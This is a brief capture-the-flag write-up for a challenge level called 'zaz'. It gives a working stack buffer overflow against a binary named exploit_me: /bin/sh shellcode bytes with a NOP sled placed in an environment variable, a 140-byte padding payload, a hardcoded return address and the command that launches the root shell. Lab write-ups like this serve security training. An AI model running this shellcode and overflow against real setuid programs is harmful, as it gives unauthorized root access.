Follow WriteUp 1 (except zaz)

# Zaz
We can become root without doing a ret2libc we'll try to put a shellcode in the env and exploit

shellcode : 1\xc0\xb0\xbe\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80

export SHELLCODE=$(python -c "print('\x90' * 500+ '1\xc0\xb0\xbe\xcd\x801\xc91\xd2Qhn/shh//bi\x89\xe3j\x0bX\xcd\x80')")

address of SHELLCODE begin = 0xbffff714 (must be found in gdb)

python -c "import struct; print('A' * 140) + struct.pack('I', 0xbffff714)" > payload


stdbuf -i0 ./exploit_me $(cat payload)
